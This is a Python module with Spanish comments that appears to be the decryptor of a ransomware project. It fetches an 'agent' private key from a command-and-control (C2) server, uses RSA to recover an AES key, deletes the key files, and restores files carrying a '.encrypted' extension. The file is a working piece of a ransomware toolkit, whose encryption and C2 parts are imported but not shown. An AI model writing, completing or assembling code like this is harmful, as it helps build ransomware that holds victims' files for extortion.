import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from find_files import find_files
import agent

def load_private_rsa_key(): 
    path_rsa_private_key = os.path.abspath("rsa_private.pem")
    with open(path_rsa_private_key, "rb") as clave_file:
        return RSA.import_key(clave_file.read())

def load_aes_key_encrypted():
    path_aes_key = os.path.abspath("aes_key_encrypted.bin")
    with open(path_aes_key, "rb") as clave_file:
        return clave_file.read()

def decrypt_aes_key_encrypted (rsa_private_key, aes_key_encrypted):
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    return cipher_rsa.decrypt(aes_key_encrypted)

def decrypt_file(file, aes_key_decrypted):
    try:
        with open(file, "rb") as f:
            nonce_and_encrypted_data = f.read()
        nonce = nonce_and_encrypted_data[:12]  # El nonce ocupa los primeros 12 bytes
        encrypted_data = nonce_and_encrypted_data[12:]
        cipher = AES.new(aes_key_decrypted, AES.MODE_CTR, nonce=nonce)
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file, "wb") as f:
            f.write(decrypted_data)  # Sobrescribimos el archivo con los datos descifrados
        file_decrypted = file[:-10]  # Elimina la extensión '.encrypted'
        os.rename(file, file_decrypted)  # Renombramos el archivo, eliminando la extensión '.encrypted'
        print(f"Archivo descifrado: {file} -> {file_decrypted}")
    except Exception as e:
        print(f"Error descifrando {file}: {e}")

def decrypt_files():
    # Descifra todos los archivos cifrados encontrados
    agent.get_private_key()  # Obtiene la clave privada del agente desde C2
    files = find_files()  # Obtiene la lista de archivos a descifrar
    rsa_private_key = load_private_rsa_key()  # Carga la clave privada RSA
    aes_key_encrypted = load_aes_key_encrypted()  # Carga la clave AES cifrada
    # Descifra la clave AES con la privada RSA
    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)  
    os.remove("aes_key_encrypted.bin")  # Elimina la clave AES cifrada después de su uso
    os.remove("rsa_private.pem") # Elimina la clave privada RSA
    for file in files:
        # Verifica que el archivo tenga la extensión '.encrypted' 
        if file.endswith(".encrypted"):  
            decrypt_file(file, aes_key)  # Llama a la función para descifrar el archivo
    print("Archivos descifrados correctamente.")  

